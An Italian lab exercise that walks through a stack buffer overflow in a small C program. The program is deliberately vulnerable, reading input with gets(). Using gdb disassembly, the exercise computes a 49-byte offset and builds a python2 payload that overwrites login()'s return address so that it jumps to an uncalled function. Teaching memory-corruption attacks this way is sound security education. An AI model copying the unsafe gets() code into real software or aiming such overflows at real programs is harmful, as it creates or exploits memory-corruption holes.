# Esercizio 3.1 – Forzare l'invocazione di una funzione inesistente

## Codice C
```c
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

bool login(){
    char password[X];
    printf("Inserisci la parola d'ordine: \n");
    gets(password);
    return strcmp(password, "segreto") == 0;
}

void accedi(){
    printf("Hai eseguito l'accesso correttamente\n");
}

void impossibile(){
    printf("Funzione mai invocata!\n");
}

int main(int argc, char* argv[]){
    bool autorizzato;

    autorizzato = login();

    if (autorizzato)
        accedi();
    else
        printf("Spiacente, parola d'ordine errata. Accesso negato\r\n");

    return 0;
}
```

In questo esercizio vogliamo usare un **buffer overflow** per modificare **l'indirizzo di ritorno** della funzione `login()` e far sì che, invece di tornare al `main()`, si esegua la funzione `impossibile()`, altrimenti mai chiamata.

---

## Analisi della funzione `login`

Eseguiamo il disassemblaggio:
```gdb
(gdb) disass login
Dump of assembler code for function login:
   0x0804846b <+0>:     push   %ebp
   0x0804846c <+1>:     mov    %esp,%ebp
   0x0804846e <+3>:     sub    $0x38,%esp
   0x08048471 <+6>:     sub    $0xc,%esp
   0x08048474 <+9>:     push   $0x80485a0
   0x08048479 <+14>:    call   0x8048340 <puts@plt>
   0x0804847e <+19>:    add    $0x10,%esp
   0x08048481 <+22>:    sub    $0xc,%esp
   0x08048484 <+25>:    lea    -0x2d(%ebp),%eax   ; buffer
   0x08048487 <+28>:    push   %eax
   0x08048488 <+29>:    call   0x8048330 <gets@plt>
   0x0804848d <+34>:    add    $0x10,%esp
   0x08048490 <+37>:    sub    $0x8,%esp
   0x08048493 <+40>:    push   $0x80485bf
   0x08048498 <+45>:    lea    -0x2d(%ebp),%eax   ; buffer
   0x0804849b <+48>:    push   %eax
   0x0804849c <+49>:    call   0x8048320 <strcmp@plt>
   0x080484a1 <+54>:    add    $0x10,%esp
   0x080484a4 <+57>:    test   %eax,%eax
   0x080484a6 <+59>:    sete   %al
   0x080484a9 <+62>:    leave
   0x080484aa <+63>:    ret
End of assembler dump.
```

La funzione:
1. Stampa un messaggio ("Inserisci la parola d'ordine")
2. Legge l'input nel **buffer** `-0x2d(%ebp)` tramite `gets()`.
3. Confronta (`strcmp`) l'input con la stringa "segreto".
4. Se `strcmp == 0`, imposta `%al = 1` (ritorna `true`), altrimenti 0 (`false`).
5. Fa `leave; ret`.

### Distanza tra il buffer e il return address

Con un breakpoint a `main+29` o proprio alla `gets()`, verifichiamo con `info registers`:
```
(gdb) i r
eax = 0xffffd59b
...
ebp = 0xffffd5c8
```

- Il buffer inizia a `eax = 0xffffd59b` (dato dalla `lea -0x2d(%ebp), %eax`).
- `ebp = 0xffffd5c8`.

Allora:
```
offset  = ebp - eax
        = 0xffffd5c8 - 0xffffd59b
        = 45
```

**Attenzione**: questo offset di 45 byte ti porta fino al **saved EBP** (ovvero l'area dove si trova il vecchio EBP sullo stack). Ma per sovrascrivere il **return address**, devi superare anche quei 4 byte. Quindi:

```
45 (fino al saved EBP) + 4 (size of saved EBP) = 49
```

Per cui, **49 byte** di riempimento totali prima di iniziare a sovrascrivere l'indirizzo di ritorno.

## Indirizzo di `impossibile()`

Usiamo `disass impossibile` o `p impossibile` per scoprire dove si trova:
```gdb
(gdb) disass impossibile
...
   0x080484c4 <+0>: push %ebp
   ...

Indirizzo di inizio funzione: 0x080484c4
```

In esadecimale, `0x080484c4` in **little endian** si rappresenta come:
```
\xc4\x84\x04\x08
```

## Creazione del Payload

Costruiamo quindi un payload di:
1. **49 byte** di filler (per sovrascrivere il buffer e il saved EBP)
2. 4 byte con l'indirizzo di `impossibile()` in little endian.

Esempio:

```bash
python2 -c "print 'A'*49 + '\xc4\x84\x04\x08'" | ./esercizio3_1
```

### Risultato

Se tutto funziona, vedremo:
```
Inserisci la parola d'ordine:
Funzione mai invocata!
Segmentation fault
```

(o potrebbe chiudersi senza `Segmentation fault` a seconda delle protezioni e di come gestisce il ritorno dopo `impossibile()`).

**In ogni caso**, significa che abbiamo sovrascritto con successo il return address di `login()` e abbiamo eseguito la funzione `impossibile()`. Se volessimo un'uscita "pulita", potremmo dover aggiustare la call e/o i registri.

